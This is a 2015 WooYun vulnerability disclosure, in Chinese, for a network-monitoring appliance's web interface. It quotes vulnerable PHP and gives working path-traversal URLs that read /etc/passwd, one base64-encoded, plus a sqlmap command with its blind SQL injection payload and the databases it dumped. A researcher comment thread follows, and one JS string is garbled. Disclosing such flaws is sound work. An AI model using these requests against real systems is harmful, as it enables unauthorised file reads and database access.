{"id": 69681, "wybug_id": "wooyun-2015-0126977", "wybug_title": "中科新业网络哨兵两处任意文件读取+两处sql注入", "wybug_corp": "中科新业", "wybug_author": "牛肉包子", "wybug_date": "2015-07-17 17:23", "wybug_open_date": "2015-10-15 16:26", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-17：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向公众公开  简要描述： 无需登录 详细说明：  文件读取#1看到include/get_file.php\n@set_time_limit( 60 );if ( isset( $_GET['view'] ) && file_exists( $_GET['view'] ) ){\t\t\t\theader( \"Content-Type: application/octet-stream\" );\t\t\t\theader( \"Content-Disposition: attachment; filename=\".basename( $_GET['view'] ) );\t\t\t\treadfile( $_GET['view'] );}else if ( isset( $_GET['view'] ) ){\t\t\t\techo $_GET['view'].\" 不能读取!\";}?>\n直接读取\n/ucenter/include/get_file.php?view=../../../../../../../etc/passwd\n\n\n任意文件读取#2tjbb/webmail_raw.php\nfunction _striptext( $document ){\t\t\t\t$search = array( \"'<script[^>]*?>[^(document.getElementById)].*?</script>'si\" );\t\t\t\t$replace = array( \"\" );\t\t\t\t$text = preg_replace( $search, $replace, $document );\t\t\t\treturn $text;}echo \"<div align=\\\"center\\\" style=\\\"color:#FF0000;\\\" > <img  border=\\\"0\\\" src=\\\"../images/bianmachange.gif\\\"/></div><hr size=\\\"1\\\" />\";$file = base64_decode( $_GET['path'] );if ( file_exists( $file ) ){\t\t\t\techo file_get_contents( $file );}else{\t\t\t\techo \"文件不存在\";}?>\n只需base64_encode一下\n/ucenter/tjbb/webmail_raw.php?path=Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==\n\n\nsql注入ucenter/admin/wsconfig.php\nheader( \"Content-Type:text/html;charset=GB2312\" );session_start( );include( \"../include/globalvar.h\" );include( \"../include/connectdb.php\" );include( \"./authorize.php\" );include( \"../include/printerror.php\" );include( \"../include/addsystemlog.php\" );include( \"../include/sendcmd.php\" );if ( $_GET['act'] == \"Edt\" ){\t\t\t\t$sql = \"SELECT * FROM up_status_property WHERE id=\".$_GET['id']; //注入1\t\t\t\t$gDb->query( $sql );\t\t\t\t$gDb->next_record( );\t\t\t\t$callbackurl = $gDb->Record['callbackurl'];\t\t\t\t$verifyid = $gDb->Record['verifyid'];\t\t\t\t$valid_time = $gDb->Record['valid_time'];\t\t\t\t$valid_time = substr( $valid_time, 0, strpos( $valid_time, \" \" ) );\t\t\t\t$actionurl = \"wsconfig.php?act=Edt&id=\".$_GET['id'];}else if ( $_GET['act'] == \"Add\" ){\t\t\t\t$html = \"\\t\\t<tr>\\n\\t\\t\\t<td height=\\\"35\\\" align=\\\"right\\\" class=\\\"btd\\\">本地/远程：</td>\\n\\t\\t\\t<td class=\\\"btd\\\"><select name=\\\"local_or_remote\\\"><option value=\\\"0\\\">本地</option><option value=\\\"1\\\" selected>远程</option></select> <font color=\\\"#FF0000\\\">*</font></td>\\n\\t\\t</tr>\";\t\t\t\t$actionurl = \"wsconfig.php?act=Add\";}if ( $_SERVER['REQUEST_METHOD'] == \"POST\" ){\t\t\t\tif ( $_GET['act'] == \"Edt\" )\t\t\t\t{\t\t\t\t\t\t\t\t$sql = \"UPDATE up_status_property SET callbackurl='\".$_POST['callbackurl'].\"', verifyid='\".$_POST['verifyid'].\"', valid_time='\".$_POST['valid_time'].\" 23:59:59\".\"' WHERE id=\".$_GET['id']; //注入2\t\t\t\t\t\t\t\t$gDb->query( $sql );\t\t\t\t\t\t\t\tprinterror( \"WEBSERVICE配置修改成功！\", \"sysinfo.php?kind=webservice\" );\t\t\t\t}\t\t\t\telse if ( $_GET['act'] == \"Add\" )\t\t\t\t{\t\t\t\t\t\t\t\t$sql = \"INSERT INTO up_status_property SET callbackurl='\".$_POST['callbackurl'].\"', verifyid='\".$_POST['verifyid'].\"', valid_time='\".$_POST['valid_time'].\" 23:59:59\".\"', flag=\".$_POST['local_or_remote'];\t\t\t\t\t\t\t\t$gDb->query( $sql );\t\t\t\t\t\t\t\tprinterror( \"WEBSERVICE配置添加成功！\", \"sysinfo.php?kind=webservice\" );\t\t\t\t}}echo \"\\n<LINK href=\\\"css/common.css\\\" type=\\\"text/css\\\" rel=\\\"stylesheet\\\">\\n\";echo \"<S\";echo \"CRIPT LANGUAGE=\\\"JavaScript\\\" src=\\\"../include/common.js\\\"></SCRIPT>\\n<form name=\\\"wsForm\\\" method=\\\"POST\\\" action=\\\"\";echo \"\\\" onsubmit=\\\"return verifyInput();\\\">\\n<table width=\\\"100%\\\" border=0>\\n\\t\";echo $html;echo \"    <tr>\\n\\t\\t<td height=\\\"40\\\" align=\\\"right\\\" class=\\\"btd\\\">授权码： </td>\\n\\t\\t<td class=\\\"btd\\\"><input type=\\\"text\\\" name=\\\"verifyid\\\" value=\\\"\";echo $verifyid;echo \"\\\"> <font color=\\\"#FF0000\\\">*</font></td>\\n\\t</tr>\\n\\t<tr>\\n\\t\\t<td height=\\\"40\\\" align=\\\"right\\\" class=\\\"btd\\\">有效期： </td>\\n\\t\\t<td class=\\\"btd\\\"><input type='text' name='valid_time' onclick=\\\"onselectdate(this.form.valid_time);return false;\\\" readonly size=\\\"10\\\" value=\\\"\";echo $valid_time;echo \"\\\" class=\\\"bbox\\\" size=\\\"13\\\"> <font color=\\\"#FF0000\\\">*</font></td>\\n\\t</tr>\\n\\t<tr>\\n\\t\\t<td height=\\\"85\\\" align=\\\"right\\\" class=\\\"btd\\\">回调地址： </td>\\n\\t\\t<td class=\\\"btd\\\"><textarea name=\\\"callbackurl\\\" cols=\\\"50\\\" rows=\\\"4\\\">\";echo $callbackurl;echo \"</textarea> <font color=\\\"#FF0000\\\">*</font></td>\\n\\t</tr>\\n\\t<tr>\\n\\t\\t<td height=\\\"40\\\" class=\\\"btd\\\"></td>\\n\\t\\t<td>\\n\\t\\t\\t<input type=\\\"submit\\\" name=\\\"sub\\\" value=\\\"保 存\\\">\\n\\t\\t\\t<input type=\\\"button\\\" name=\\\"ret\\\" value=\\\"返 回\\\" onclick=\\\"window.location='sysinfo.php?kind=webservice'\\\"> \\n\\t\\t</td>\\n\\t</tr>\\n</table>\\n</form>\\n\";echo \"<s\";echo \"cript language=\\\"javascript\\\">\\n<!--\\nfunction verifyInput()\\n{\\n\\tif(!killspace(document.wsForm.verifyid.value))\\n\\t{\\n\\t\\talert(\\\"授权码不能为空！\\\");\\n\\t\\tdocument.wsForm.verifyid.focus();\\n\\t\\treturn false;\\n\\t}\\n\\tif(!killspace(document.wsForm.valid_time.value))\\n\\t{\\n\\t\\talert(\\\"有效期不能为空！\\\");\\n\\t\\tdocument.wsForm.valid_time.focus();\\n\\t\\treturn false;\\n\\t}\\n\\tif(!killspace(document.wsForm.callbackurl.value))\\n\\t{\\n\\t\\talert(\\\"回调?;echo \"刂凡荒芪眨\");\\n\\t\\tdocument.wsForm.callbackurl.focus();\\n\\t\\treturn false;\\n\\t}\\n}\\n//-->\\n</script>\\n\";?>\n\nsqlmap.py -u \"**.**.**.**/ucenter/admin/addswitchmanage.php?act=E&id=1\" -p \"id\" --dbs\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: act=E&id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))ToKi)---web application technology: Apacheback-end DBMS: MySQL 5.0.11available databases [9]:[*] `#mysql50#ucenter_08-12-26-17-21-57OURCE`[*] cluster[*] information_schema[*] mysql[*] ucenter[*] ucenter_big_tables[*] ucenter_gbk_bak[*] ucenter_org[*] ucenter_other_tables\n   漏洞证明：  案例\n**.**.**.**/ucenter/include/get_file.php?view=../../../../../../../etc/passwd**.**.**.**/ucenter/include/get_file.php?view=../../../../../../../etc/passwd**.**.**.**/ucenter/include/get_file.php?view=../../../../../../../etc/passwd**.**.**.**/ucenter/include/get_file.php?view=../../../../../../../etc/passwd**.**.**.**/ucenter/include/get_file.php?view=../../../../../../../etc/passwd\n   修复方案：  \n\n   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-07-17 16:25 厂商回复： CNVD确认所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-15 17:30 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:798 漏洞数:99        )\t\t \n  哪来的源码..    \n     2015-07-15 17:54 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  @玉林嘎 小厂商 不挖了。    \n     2015-07-15 18:02 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:764 漏洞数:147        | http://menmen519.blog.sohu.com/)\t\t \n  积少成多 就能上主页    \n     2015-07-15 18:06 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  @menmen519 你那几个上首页没    \n     2015-07-15 18:07 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:764 漏洞数:147        | http://menmen519.blog.sohu.com/)\t\t \n  @牛肉包子 好像两个上了吧 这个没有什么意思 就没有再挖 这种简单粗暴的漏洞会把人挖傻的     \n     2015-07-15 18:14 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  @menmen519 23333  话说 我命令执行为啥根本没用 0.0    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}